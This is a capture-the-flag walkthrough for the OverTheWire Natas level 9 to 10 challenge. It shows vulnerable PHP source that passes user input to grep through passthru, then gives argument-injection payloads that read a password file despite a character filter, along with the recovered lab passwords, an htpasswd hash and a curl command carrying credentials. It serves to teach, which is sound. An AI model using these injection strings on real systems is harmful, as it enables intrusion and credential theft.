Natas Level 9 → Level 10
========================

Username: natas10

URL:      http://natas10.natas.labs.overthewire.org


Solution
========

This level is similar to level 8-9 but this time the input is filtered. At least that's what the website complains:

```
For security reasons, we now filter on certain characters
```

As always we take a look into the website's source code:

```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Too bad. The code ```if(preg_match('/[;|&]/',$key))``` means that the command ```grep -i $key dictionary.txt```isn't executed if there's any of the characters ```;```, ```|``` or ```&``` inside of the web user's input (```$key```). Therefore we neither can inject any code execution like ```popel dictionary; ls #``` nor ```popel dictionary && ls #``` like we did in level 8-9.

According to the Manpage of ```grep```, it can be used to look for patterns in one file as well as multiple times at once:
```
man grep
```
> The grep utility searches any given input files, selecting lines that match one or more patterns.

> grep [-abcdDEFGHhIiJLlmnOopqRSsUVvwxZ] [-A num] [-B num] [-C[num]] [-e pattern] [-f file]
       [--binary-files=value] [--color[=when]] [--colour[=when]] [--context[=num]] [--label]
       [--line-buffered] [--null] [pattern] [file ...]

Therefore we don't necessarily have to comment out the initial occurence of 'dictionary.txt' in the command line ```grep -i $key dictionary.txt```. But since the character ```#``` is not filtered out, we don't have to worry about it. Just leave it in the string because it will save us some computation, waiting time and reduces the overall output of grep. 
More thoughts are required in order to find an appropriate search pattern because we can not concatenate several commands due to the fact that the characters ```;``` and ```&``` are filtered out. Unfortunately neither do we know which characters are included in next level's password nor can we exclude some. In [regular expressions](https://en.wikipedia.org/wiki/Regular_expression) the ```.``` (dot) represents any character. Using a single ```.``` could be the best choice for our search pattern because it means "*let grep print any line of a file regardless of what's inside of it*". This leads us to the following string which we want to enter in the web form in order to get the next level's password:

```
.  /etc/natas_webpass/natas11 #
```

The resulting command line code that gets executed when we submit the web form looks like this then:

```
passthru("grep -i . /etc/natas_webpass/natas11 # dictionary.txt");
```

This reads "*use grep to print every line of /etc/natas_webpass/natas11 and ignore the file dictionary.txt*". 
Consequently the resulting web site looks like this:

```
Output:

U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

Bingo! =)


Alternative strings
-------------------

```
.* /etc/natas_webpass/natas11 #
```
```
Output:

.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

```
```
.* /etc/natas_webpass/natas11 
```
```
Output:

.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
[...]
```
```
.  /etc/natas_webpass/natas11
```
```
Output:

/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
[...]
```

Note to myself
--------------

Instead of using a GUI web browser like Firefox one can use cURL instead:

```
curl --data "needle=. /etc/natas_webpass/natas11 #" http://natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl@natas9.natas.labs.overthewire.org/
```
